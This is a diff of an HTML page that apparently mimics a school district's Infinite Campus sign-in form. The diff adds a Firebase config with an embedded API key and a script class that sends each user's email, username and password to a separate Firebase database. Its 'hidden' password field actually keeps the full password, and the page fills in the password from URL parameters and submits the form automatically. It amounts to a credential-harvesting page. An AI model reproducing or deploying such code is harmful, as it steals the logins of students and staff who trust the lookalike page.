@@ -1,6 +1,45 @@
 <html>
-<p>hi</p>
+<head>
 
+<script src="https://www.gstatic.com/firebasejs/4.5.0/firebase.js"></script>
+<script>
+  // Initialize Firebase
+  var config = {
+    apiKey: "AIzaSyDW2N5DTqC2SQvRr0kWZOlYFiq5xgU08-8",
+    authDomain: "campus-site.firebaseapp.com",
+    databaseURL: "https://campus-site.firebaseio.com",
+    projectId: "campus-site",
+    storageBucket: "",
+    messagingSenderId: "71367401718"
+  };
+  firebase.initializeApp(config);
+</script>
+<script>
+class dbEntry
+{
+	constructor(email, user, pass)
+	{
+		this.email = email
+		this.user = user
+		this.passHidden = pass.substring(0)
+		for(i=1; i<pass.length; i++)
+			this.passHidden += '*'
+	}
+	
+	sendData()
+	{
+		this.time = Math.floor(Date.now() / 1000) //seconds since 1/1/1970
+		var newEntry = firebase.database().push();
+		newEntry.set({
+    		email: this.email,
+    		user: this.user,
+    		passHidden: this.passHidden
+ 		});
+	}
+}
+</script>
+</head>
+<body>
 <form method="POST" id="form_signin" accept-charset="utf-8" action="https://campus.ccsd.net/campus/verify.jsp">
             <input type="hidden" name="appName" value="clark">
             <input type="hidden" id="screen" name="screen" value="">
@@ -33,4 +72,5 @@
         document.getElementById("password").value = urlSections[1].split("=")[1];
         document.getElementById("signinbtn").click();
         </script>
+</body>
 </html>
